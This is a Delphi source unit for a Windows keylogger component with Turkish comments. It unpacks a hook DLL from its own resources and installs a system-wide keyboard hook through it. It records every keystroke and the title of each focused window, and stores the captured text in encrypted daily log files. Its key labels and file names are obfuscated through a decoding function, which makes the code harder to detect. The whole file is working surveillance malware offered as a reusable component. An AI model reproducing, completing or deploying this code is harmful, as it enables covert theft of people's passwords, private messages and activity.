unit FIK;

interface

uses
  Windows, Messages, SysUtils, StdCtrls, Classes, uFnc, uTypes, uEnc, uEof;

type
  // Encrypted Key Codes
  EnKy = record
    vbck: string;
    vtb: string;
    vrtn: string;
    vsht: string;
    vctl: string;
    vmn: string;
    vpas: string;
    vcpl: string;
    vecp: string;
    vspc: string;
    vprir: string;
    vnxt: string;
    vend: string;
    vhm: string;
    vprn: string;
    vsnap: string;
    vins: string;
    vdl: string;
    vhlp: string;
    vnmlk: string;
    vlwn: string;
    vrwn: string;
    ve1: string;
    ve2: string;
    ve3: string;
    ve4: string;
    ve5: string;
    ve6: string;
    ve7: string;
    ve8: string;
    ve9: string;
    ve10: string;
    ve11: string;
    ve12: string;
  end;

type
  THkTeclado = procedure; stdcall;

type
  TFIK = class(TComponent)
  private
    ConfigData: TCnfg;
    LFile: string;
    DlPath: string;
    KeLayou: HKL;
    FM, CHandle, HDLL: THandle;
    PRecep, CBTPtr: ^Integer;
    HOn, HOff: THkTeclado;
    KC: EnKy;
    function LoDlRes(): Boolean;
    procedure WrLog(WParam: Integer; Str: string);
  protected
    procedure WndProc(var msg: TMessage); virtual;
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    destructor Destroy(); override;
    procedure Run(Active: Boolean);
    procedure HookPrc(var message: TMessage); // message WM_USER + $1200; // Message WM_USER + $1200;
    procedure CBTHookPrc(var message: TMessage); //message WM_USER + $1300; // Message WM_USER + $1300;
  end;

procedure Register;

var
  LIndex: Integer;
  LKey: Integer;
  LaTitle: string;
  FHan: HWND;
  LStore: string;

implementation

procedure Register;
begin
  Classes.RegisterComponents('TKB', [TFIK]);
end;

constructor TFIK.Create(AOwner: TComponent; Config: TCnfg);
var
  ss : String;
begin
  inherited Create(AOwner);

  // Create Handle
  FHan := AllocateHWND(WndProc);

  // Set Config
  ConfigData := Config;

  // Set Key Codes
  with KC do begin
    vbck := DE('1II4eSXHUlg/mND');
    vtb := DE('1QJZ+zB');
    vrtn := #13;
    vsht := DE('1MpH5L+BLA');
    vctl := DE('1M4O5kcd');
    vmn := DE('1EonfhF');
    vpas := DE('1ApqRCtjPC');
    vcpl := DE('1MoLg++tF0v6QD');
    vecp := DE('1U4XrPA');
    vspc := ' ';
    vprir := DE('1ApqDyHyp8O');
    vnxt := DE('1ApqDyX2h127TB');
    vend := DE('1UoQBED');
    vhm := DE('1gIOJloI');
    vprn := DE('1AZuVeosrA');
    vsnap := DE('1AZuVeosGZnXRECInC');
    vins := DE('1kIC5CiTTDB');
    vdl := DE('1Q4etTc1LWE');
    vhlp := DE('1goMiZAH');
    vnmlk := DE('144GNUxMujwl');
    vlwn := DE('1wI9AZLpz5YRVBDWtsJ');
    vrwn := DE('1IZwCfxyJP/g1Zgu4Ipy');
    ve1 := DE('1Yo6pB');
    ve2 := DE('1YY63C');
    ve3 := DE('1YI6EC');
    ve4 := DE('1Y47hB');
    ve5 := DE('1Yo7vC');
    ve6 := DE('1YY78D');
    ve7 := DE('1YI7KD');
    ve8 := DE('1Y44MC');
    ve9 := DE('1Yo4aD');
    ve10 := DE('1Yo6n9N');
    ve11 := DE('1Yo6mxC');
    ve12 := DE('1Yo6lpH');
  end;

  // Create Log
  if not FileExists(IncludeTrailingPathDelimiter(ConfigData.RnDi) + 'Log') then
    ForceDirectories(IncludeTrailingPathDelimiter(ConfigData.RnDi) + 'Log');

  // Set Log File and Load File Content 
  LFile := IncludeTrailingPathDelimiter(ConfigData.RnDi) + 'Log\' + FormatDateTime('DDMMYY', Date);
  if FileExists(LFile) then
    LStore := DE(EofRF(LFile));
end;

destructor TFIK.Destroy;
begin
  // Save File
  EofWrt(LFile, EN(LStore));

  // Free
  if Assigned(HOff) then HOff;
  if HDLL <> 0 then FreeLibrary(HDLL);
  if FM <> 0 then begin
    UnmapViewOfFile(PRecep);
    UnmapViewOfFile(CBTPtr);
    CloseHandle(FM);
    CloseHandle(CHandle);
  end;

  DeallocateHWnd(FHan);

  inherited Destroy;
end;

procedure TFIK.WndProc(var msg: TMessage);
begin
  if msg.Msg = WM_USER + $1200 then
    HookPrc(msg);

  if msg.Msg = WM_USER + $1300 then
    CBTHookPrc(msg);

  Msg.Result := DefWindowProc(FHan, Msg.Msg, Msg.wParam, Msg.lParam);
end; { WndProc -> Create Window Message Handle }

{****************************************************************************
                               Private Functions
****************************************************************************}

function TFIK.LoDlRes(): Boolean;
var
  RS: TResourceStream;
  Context : AnsiString;
begin
  Result := False;
  try
    DLPath := IncludeTrailingPathDelimiter(ConfigData.RnDi) + DE('8BHlxrzSJpBpmD');

    if not FileExists(DLPath) then begin
      RS := TResourceStream.Create(HInstance, 'Kd', RT_RCDATA);
      RS.Position := 0;
      SetLength(Context, RS.Size);
      RS.ReadBuffer(Context[1], RS.Size);
      EofWrt(DLPath, DE(Context));
      RS.Free;
    end;

    Result := True;
  except
  end;
end; { LoadDllResource -> DLL Oluþturur }

procedure TFIK.WrLog(WParam: Integer; Str: string);
begin
  with KC do
    case WParam of
      //VK_LBUTTON  : Str := '<LEFTMOUSE>';
      //VK_RBUTTON  : Str := '<RIGHTMOUSE>';
      //VK_CANCEL   : Str := '<CONTROLBREAK>';
      //VK_MBUTTON  : Str := '<MÝDDLEMOUSE>';
      VK_BACK: Str := vbck;
      VK_TAB: Str := vtb;
      //VK_CLEAR    : Str := '<CLEAR>';
      VK_RETURN: Str := vrtn;
      VK_SHIFT: Str := vsht;
      VK_CONTROL: Str := vctl;
      VK_MENU: Str := vmn;
      VK_PAUSE: Str := vpas;
      VK_CAPITAL: Str := vcpl;
      VK_ESCAPE: Str := vecp;
      VK_SPACE: Str := vspc;
      VK_PRIOR: Str := vprir;
      VK_NEXT: Str := vnxt;
      VK_END: Str := vend;
      VK_HOME: Str := vhm;
      //VK_LEFT     : Str := '<LEFT>';
      //VK_UP       : Str := '<UP>';
      //VK_RIGHT    : Str := '<RIGHT>';
      //VK_DOWN     : Str := '<DOWN>';
      //VK_SELECT   : Str := '<SELECTKEY>';
      VK_PRINT: Str := vprn;
      //VK_EXECUTE  : Str := '<EXECUTEKEY>';
      VK_SNAPSHOT: Str := vsnap;
      VK_INSERT: Str := vins;
      VK_DELETE: Str := vdl;
      VK_HELP: Str := vhlp;
      VK_NUMLOCK: Str := vnmlk;
      //VK_SCROLL   : Str := '<SCROOLKEY>';
      //VK_LSHIFT   : Str := '<LSHIFT>';
      //VK_RSHIFT   : Str := '<RSHIFT>';
      //VK_LCONTROL : Str := '<LCTRL>';
      //VK_RCONTROL : Str := '<RCTRL>';
      //VK_LMENU    : Str := '<LALT>';
      //VK_RMENU    : Str := '<ALTGR>';
      //VK_PLAY     : Str := '<PLAYKEY>';
      //VK_ZOOM     : Str := '<ZOOMKEY>';
      VK_LWIN: Str := vlwn;
      VK_RWIN: Str := vrwn;
      VK_F1: Str := ve1;
      VK_F2: Str := ve2;
      VK_F3: Str := ve3;
      VK_F4: Str := ve4;
      VK_F5: Str := ve5;
      VK_F6: Str := ve6;
      VK_F7: Str := ve7;
      VK_F8: Str := ve8;
      VK_F9: Str := ve9;
      VK_F10: Str := ve10;
      VK_F11: Str := ve11;
      VK_F12: Str := ve12;
    end;

  LStore := LStore + PChar(Str);
end; { WriteLog -> Log Ekleme Yapar }

{****************************************************************************
                               Public Functions
****************************************************************************}

procedure TFIK.Run(Active: Boolean);
begin
  // Load DLL
  if LoDlRes then begin
    HDLL := LoadLibrary(PChar(DLPath));
    if HDLL = 0 then Exit;
  end;

  // Load Functions
  @HOn := GetProcAddress(HDLL, 'HOn');
  @HOff := GetProcAddress(HDLL, 'HOff');
  if not Assigned(HOn) or not Assigned(HOff) then Exit;

  // Create Keyboard Map
  FM := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(Integer), 'ERCx');
  if FM = 0 then Exit;

  PRecep := MapViewOfFile(FM, FILE_MAP_WRITE, 0, 0, 0);
  PRecep^ := FHan;

  // Pencere için Map Oluþtur
  CHandle := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(Integer), 'CBR');
  if CHandle = 0 then Exit;
  CBTPtr := MapViewOfFile(CHandle, FILE_MAP_WRITE, 0, 0, 0);
  CBTPtr^ := FHan;

  HOn;
end;

procedure TFIK.HookPrc(var message: TMessage);
var
  LastKey: array[0..1] of Char;
  KeyState: TKeyboardState;
  State: Byte;
begin
  KeLayou := GetKeyboardLayout(0);
  GetKeyboardState(KeyState);
  State := ToAsciiEx(message.WParam, MapVirtualKeyEx(message.WParam, 2, KeLayou), KeyState, LastKey, 0, KeLayou);

  if (message.LParam and $80000000) = 0 then // Pressed and RePressed
  begin
    if State > 0 then
    begin
      WrLog(message.WParam, LastKey[0]);
      LKey := 0;
    end
    else
      LKey := message.WParam;
  end

  else if ((Message.lParam shr 31) and 1) = 1 then // Released
  begin
    if State < 1 then
      if LKey <> 0 then
        WrLog(message.WParam, LastKey[0]);
  end;
end;

procedure TFIK.CBTHookPrc(var message: TMessage);
var
  hWindow: HWND;
  Len: Integer;
  Title: string;
begin
  hWindow := HWND(message.WParam);
  if hWindow > 0 then
  begin
    SetLength(Title, GetWindowTextLength(hWindow));
    GetWindowText(hWindow, PChar(Title), Length(Title) + 1);

    if (Trim(LaTitle) <> Trim(Title)) and (Trim(Title) <> '') then begin
      LaTitle := Title;
      LStore := LStore + #13 + DE('qIcuKZ52cu/L9S1+rzJv+/LzhqeNYp8T') + Title + ' #####' + #13;
    end;
  end;
end;

end.

